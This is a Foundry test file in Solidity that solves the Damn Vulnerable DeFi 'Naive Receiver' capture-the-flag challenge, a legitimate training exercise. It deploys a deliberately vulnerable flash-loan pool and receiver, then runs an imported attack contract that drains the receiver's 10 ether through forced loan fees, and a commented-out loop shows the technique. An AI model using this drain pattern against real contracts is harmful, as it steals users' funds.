// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "@dev/forge-std/Test.sol";
import {
    FlashLoanReceiver,
    NaiveReceiverLenderPool,
    NaiveReceiverHack
} from "@contracts/CTF/Damn-Vulnerable-DeFi/02.Naive-Receiver.sol";

/*
    https://www.damnvulnerabledefi.xyz/challenges/naive-receiver/

    forge test --match-path foundry/test/CTF/Damn-Vulnerable-DeFi/02.Naive-Receiver.t.sol -vvvvv
*/

contract Challenge_2_Naive_ReceiverTest is Test {
    // hacking attack address
    address private deployer = address(1);
    address private feeRecipient = address(2);
    address private player = address(2333);
    NaiveReceiverLenderPool private pool;
    FlashLoanReceiver private receiver;

    uint256 private ETHER_IN_POOL = 1000 ether;
    uint256 private ETHER_IN_RECEIVER = 10 ether;

    function setUp() public {
        vm.startPrank(deployer);
        vm.deal(deployer, type(uint256).max);
        _before();
        vm.stopPrank();

        vm.startPrank(player);
    }

    function _before() public {
        /* SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        pool = new NaiveReceiverLenderPool();
        (bool isSuccess,) = address(pool).call{ value: ETHER_IN_POOL }("");
        assertTrue(isSuccess, "");

        assertEq(address(pool).balance, ETHER_IN_POOL, "");
        assertEq(pool.maxFlashLoan(pool.ETH()), ETHER_IN_POOL, "");
        assertEq(pool.flashFee(pool.ETH(), 0), 1 ether, "");

        receiver = new FlashLoanReceiver(address(pool));
        (isSuccess,) = address(receiver).call{ value: ETHER_IN_RECEIVER }("");
        assertTrue(isSuccess, "");

        // vm.expectRevert();
        // receiver.onFlashLoan(deployer, pool.ETH(), ETHER_IN_RECEIVER, 1 ether, "");
        assertEq(address(receiver).balance, ETHER_IN_RECEIVER, "ETHER_IN_RECEIVER");
    }

    function test_Exploit() public {
        /* START CODE YOUR SOLUTION HERE */
        // for (uint256 i = 0; i < 10; i++) {
        //     pool.flashLoan(receiver, pool.ETH(), 0, "0x");
        // }
        NaiveReceiverHack hackInst = new NaiveReceiverHack(payable(pool), payable(receiver));
        hackInst.attack();
        /* END CODE YOUR SOLUTION */

        vm.stopPrank();
        _after();
    }

    function _after() public {
        /* SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        vm.startPrank(deployer);
        assertEq(address(receiver).balance, 0, "Receiver Balance");
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER, "Pool Balance");
        vm.stopPrank();
    }
}
